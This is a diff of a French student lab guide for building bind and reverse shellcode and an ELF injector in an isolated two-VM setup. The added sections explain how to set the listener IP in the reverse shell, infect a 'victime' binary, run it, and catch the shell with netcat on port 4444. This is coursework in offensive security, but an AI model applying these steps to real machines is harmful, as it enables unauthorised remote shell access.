@@ -63,12 +63,6 @@ pwd
 ls -la
 ```
 
-Si nécessaire, accéder au dossier :
-
-```bash
-cd /home/thomas/esgi/ASM1
-```
-
 Arborescence attendue :
 
 ```text
@@ -189,25 +183,34 @@ Désassembler le fichier objet :
 objdump -d -M intel bindshell.o
 ```
 
-Inspecter le module ELF :
-
-```bash
-readelf -h injecteur
-objdump -d -M intel injecteur
-```
-
 ## 7. Compiler les composants du modèle reverse
 
-### 7.1. Compilation du programme assembleur
+### 7.1. Configurer l'adresse IP cible
+
+Le fichier reverseshell.asm contient l'adresse IP de la machine d'écoute.
+Cette valeur est à modifier avant compilation si le réseau change.
+
+Chercher la ligne :
+
+    mov dword [rsp+4], 0x9A12A8C0
+
+Pour calculer la valeur correspondant à votre IP :
+
+    python3 -c "import socket, struct; print(hex(struct.unpack('<I', socket.inet_aton('IP'))[0]))"
+
+Remplacer 'IP' par l'adresse de la machine d'écoute (ex : '192.168.18.154').
+Remplacer ensuite la valeur 0x9A12A8C0 par la valeur obtenue.
+
+Après modification, recompiler (voir section 7.2).
+
+### 7.2. Compilation du programme assembleur
 
 ```bash
 nasm -f elf64 reverseshell.asm -o reverseshell.o
 objcopy -O binary -j .text reverseshell.o reverseshell.bin
 ```
 
-### 7.2. Compilation du module reverse
-
-Si `injecteur_reverse.asm` est déjà présent :
+### 7.3. Compilation du module reverse
 
 ```bash
 nasm -f elf64 injecteur_reverse.asm -o injecteur_reverse.o
@@ -216,7 +219,7 @@ ld -o injecteur_reverse injecteur_reverse.o
 
 Si le fichier est absent, il doit être préparé conformément à l'interface du projet. Une simple substitution de nom de fichier ne garantit pas la compatibilité des deux variantes.
 
-### 7.3. Vérifications
+### 7.4. Vérifications
 
 Afficher les fichiers produits :
 
@@ -243,13 +246,6 @@ Désassembler les instructions :
 objdump -d -M intel reverseshell.o
 ```
 
-Examiner une instruction de configuration réseau présente dans le source, si elle existe :
-
-```bash
-grep -F 'mov dword [rsp+4]' reverseshell.asm
-```
-
-Cette commande affiche uniquement l'instruction trouvée. Elle ne valide pas la configuration réseau complète.
 
 ## 8. Étudier les modifications ELF64
 
@@ -271,94 +267,45 @@ Filtrer les segments `LOAD` et `NOTE` :
 readelf -l victime | grep -E 'LOAD|NOTE'
 ```
 
-### 8.3. Comparer deux exécutables ELF
+### 8.3. Lancer l'injection
 
-Lorsqu'un exécutable expérimental est disponible, comparer ses métadonnées avec celles du programme témoin.
-
-Pour le programme original :
+ Lancer l'injecteur puis vérifier son code de retour :
 
 ```bash
-readelf -h victime
-readelf -l victime
-```
-
-Pour un fichier de comparaison nommé `victime_modifiee` :
-
-```bash
-readelf -h victime_modifiee
-readelf -l victime_modifiee
-```
-
-Afficher uniquement les points d'entrée :
-
-```bash
-readelf -h victime | grep -Ei 'entry|entrée'
-readelf -h victime_modifiee | grep -Ei 'entry|entrée'
-```
-
-Comparer les types de segments :
-
-```bash
-readelf -l victime | grep -E 'LOAD|NOTE'
-readelf -l victime_modifiee | grep -E 'LOAD|NOTE'
-```
-
-Comparer la taille des fichiers :
-
-```bash
-stat -c '%s %n' victime victime_modifiee
-```
-
-Désassembler les deux exécutables :
-
-```bash
-objdump -d -M intel victime
-objdump -d -M intel victime_modifiee
-```
-
-Les éléments à comparer :
-
-| Élément | Description |
-|---|---|
-| `e_entry` | Adresse du point d'entrée. |
-| `p_type` | Type du segment. |
-| `p_offset` | Position dans le fichier. |
-| `p_vaddr` | Adresse virtuelle. |
-| `p_filesz` | Taille dans le fichier. |
-| `p_memsz` | Taille en mémoire. |
-| `p_flags` | Permissions. |
-| `p_align` | Alignement. |
-
-La disparition d'un segment `NOTE` ou l'apparition d'un segment `LOAD` doit être confirmée avec les résultats réels de `readelf`.
-
-### 8.4. Vérifier le résultat de la compilation
-
-Contrôler le code de retour de chaque commande immédiatement après son exécution :
-
-```bash
+./injecteur
 echo "Code de retour : $?"
 ```
-
+L'injecteur utilise le fichier binaire produit à partir de bindshell.asm. Pour tester le reverse, utiliser injecteur_reverse.
 Un code `0` indique généralement que la commande précédente s'est terminée avec succès. Il ne garantit pas que le programme compilé fonctionnera correctement.
+
+### 8.4. Lancer le binaire infecté
+
+lancement du code en binaire infecté :
+
+```bash
+./victime_infectee
+```
+
+Le fichier victime_infectee est produit par ./injecteur
 
 ## 9. Vérifier les communications réseau
 
-Les observations sont réalisées entre deux VM Ubuntu sur un réseau Host-only.
+Les communications sont étudiées dans un laboratoire isolé composé de deux machines virtuelles Ubuntu configurées sur un réseau Host-only.
 
-- VM1 : machine hébergeant le programme étudié.
-- VM2 : machine permettant les observations réseau.
+- **VM1 :** machine hébergeant le programme étudié.
+- **VM2 :** machine utilisée pour tester les connexions.
 
-### 9.1. Vérifier les adresses IP
+### 9.1. Configuration des machines virtuelles
 
-Sur chaque VM :
+Sur chaque VM, afficher les interfaces réseau :
 
 ```bash
 ip -br addr
 ```
 
-Relever l'adresse IP de l'interface Host-only.
+Identifier l'adresse IPv4 associée à l'interface Host-only.
 
-### 9.2. Vérifier la connectivité entre les VM
+### 9.2. Vérifier la connectivité
 
 Depuis VM1 :
 
@@ -372,157 +319,116 @@ Depuis VM2 :
 ping -c 4 IP_VM1
 ```
 
-Remplacer les noms par les adresses IP réelles.
+Remplacer `IP_VM1` et `IP_VM2` par les adresses relevées précédemment.
 
-### 9.3. Vérifier les ports TCP en écoute
+Si les machines peuvent communiquer, les réponses ICMP apparaissent dans le terminal. Un échec peut provenir de la configuration réseau ou du pare-feu.
+
+### 9.3. Tester une connexion entrante avec Netcat (bind)
+
+Le modèle bind repose sur une machine qui attend une connexion entrante.
+
+**Sur VM1 — Terminal 1 :**
+
+Lancer le shellcode pour ouvrir le port :
 
 ```bash
-ss -tlnp
+./victime_infectee
 ```
 
-Filtrer sur le port étudié :
+**Sur VM1 — Terminal 2 :**
+
+Vérifier que le port est ouvert :
 
 ```bash
 ss -tlnp | grep 4444
 ```
 
-Si aucun service n'écoute sur ce port, la commande ne retourne aucune ligne.
 
-### 9.4. Vérifier les connexions établies
+**Sur VM2 :**
+
+Se connecter à VM1 :
 
 ```bash
-ss -tn
+nc IP_VM1 4444
+```
+Le shellcode affiche [+] VM infectee sur la connexion.
+
+Remplacer `IP_VM1` par l'adresse IP Host-only de VM1.
+
+
+### 9.4. Tester une connexion sortante avec Netcat (reverse)
+
+Le modèle reverse repose sur une machine qui établit une connexion sortante vers une autre machine en écoute.
+
+**Sur VM2 — Terminal 1 :**
+
+Démarrer l'écoute sur le port `4444` :
+
+```bash
+nc -lvnp 4444
 ```
 
-Cette commande affiche les connexions TCP et leur état.
+**Sur VM1 — Terminal 1 :**
 
-Elle permet notamment d'observer les états `ESTAB`, `SYN-SENT` ou `TIME-WAIT`, selon les communications présentes.
+Lancer le programme pour se connecter :
 
-### 9.5. Arrêter les processus de test
+```bash
+./victime_infectee
+```
 
-Pour interrompre un programme lancé au premier plan, utiliser :
+L'adresse IP de VM2 doit être renseignée dans reverseshell.asm avant compilation (voir section 7). Le binaire victime_infectee doit avoir été produit par injecteur_reverse.
+
+**Résultat attendu sur VM2 :**
 
 ```text
-Ctrl+C
+Listening on 0.0.0.0 4444
+Connection received on IP_VM1 XXXXX
 ```
 
-Pour rechercher un processus par son nom :
+Le numéro `XXXXX` correspond au port source utilisé pour la connexion.
+
+Le message doit apparaître sur VM2.
+
+**Important :** dans le modèle reverse, VM2 doit commencer à écouter avant que VM1 tente de se connecter, sinon la connexion peut être refusée.
+
+Ces deux tests valident les communications TCP entre les VM, mais ne prouvent pas à eux seuls le fonctionnement des shellcodes assembleur.
+
+### 9.5. Arrêter les connexions de test
+
+Pour arrêter Netcat, utiliser `Ctrl+C` dans les terminaux concernés.
+
+Vérifier qu'aucun service n'écoute encore sur le port `4444` :
 
 ```bash
-ps aux | grep '[n]om_du_programme'
+ss -tlnp | grep 4444
 ```
 
-Pour arrêter un processus dont le PID est connu :
+Si aucune ligne n'est affichée, aucun service TCP en écoute sur ce port n'a été trouvé.
+
+
+## 10. Nettoyage du projet
+
+Après les tests, il est possible de supprimer les fichiers générés lors de la compilation.
+
+### Supprimer les fichiers objets et binaires bruts
 
 ```bash
-kill PID
+rm -f *.o *.bin
 ```
 
-Pour arrêter une instance de Netcat au premier plan, utiliser également `Ctrl+C`.
-
-En présence de plusieurs processus portant le même nom, vérifier leur rôle avant de les arrêter.
-
-## 10. Workflow de vérification
-
-Cette procédure rassemble les principales commandes de compilation et d'inspection dans un ordre logique.
-
-### Étape 1 — Compiler le programme témoin
+### Supprimer les exécutables générés
 
 ```bash
-nasm -f elf64 victime.asm -o victime.o
-gcc -no-pie -nostartfiles -o victime victime.o
-./victime
+rm -f victime victime_infectee
+rm -f injecteur injecteur_reverse
 ```
 
-### Étape 2 — Compiler la variante bind
+### Vérifier le dossier
 
 ```bash
-nasm -f elf64 bindshell.asm -o bindshell.o
-objcopy -O binary -j .text bindshell.o bindshell.bin
+ls -la
 ```
 
-### Étape 3 — Compiler la variante reverse
+Les fichiers sources `.asm`, `INTERFACE.md` et la documentation restent conservés.
 
-```bash
-nasm -f elf64 reverseshell.asm -o reverseshell.o
-objcopy -O binary -j .text reverseshell.o reverseshell.bin
-```
-
-### Étape 4 — Compiler le module ELF
-
-```bash
-nasm -f elf64 injecteur.asm -o injecteur.o
-ld -o injecteur injecteur.o
-```
-
-### Étape 5 — Vérifier les résultats
-
-```bash
-file victime
-readelf -h victime
-readelf -l victime
-objdump -d -M intel victime
-```
-
-Puis :
-
-```bash
-ls -lh *.o *.bin
-```
-
-### Étape 6 — Vérifier le réseau des VM
-
-```bash
-ip -br addr
-ss -tlnp
-ss -tn
-```
-
-Le guide distingue ainsi la compilation, l'analyse des exécutables et les observations réseau.
-
-## 11. Nettoyage du projet
-
-Supprimer les fichiers objets :
-
-```bash
-rm -f victime.o bindshell.o reverseshell.o
-rm -f injecteur.o injecteur_reverse.o
-```
-
-Supprimer les binaires bruts :
-
-```bash
-rm -f bindshell.bin reverseshell.bin
-```
-
-Les fichiers sources `.asm` et la documentation sont conservés.
-
-## 12. Récapitulatif
-
-| Action | Commande |
-|---|---|
-| Compiler un source NASM | `nasm -f elf64 fichier.asm -o fichier.o` |
-| Lier la victime | `gcc -no-pie -nostartfiles -o victime victime.o` |
-| Lier le module ELF | `ld -o injecteur injecteur.o` |
-| Lancer le programme témoin | `./victime` |
-| Extraire la section `.text` | `objcopy -O binary -j .text fichier.o fichier.bin` |
-| Afficher l'en-tête ELF | `readelf -h fichier` |
-| Afficher les Program Headers | `readelf -l fichier` |
-| Afficher les Section Headers | `readelf -S fichier` |
-| Désassembler | `objdump -d -M intel fichier` |
-| Examiner les octets | `xxd fichier.bin` |
-| Comparer les tailles | `stat -c '%s %n' fichier1 fichier2` |
-| Identifier les interfaces | `ip -br addr` |
-| Tester la connectivité | `ping -c 4 IP` |
-| Afficher les ports en écoute | `ss -tlnp` |
-| Afficher les connexions TCP | `ss -tn` |
-| Rechercher un processus | `ps aux` |
-| Arrêter un processus | `kill PID` |
-
-## 13. Conclusion
-
-Ce guide utilisateur permet de préparer l'environnement ASM1, de compiler les sources assembleur et d'inspecter les exécutables ELF64.
-
-Il fournit également les commandes nécessaires à la comparaison des métadonnées ELF, à la vérification de la connectivité entre les machines virtuelles et au nettoyage de l'environnement de travail.
-
-Les résultats présentés pendant la soutenance doivent provenir des essais réellement effectués sur les machines virtuelles du projet.
+---
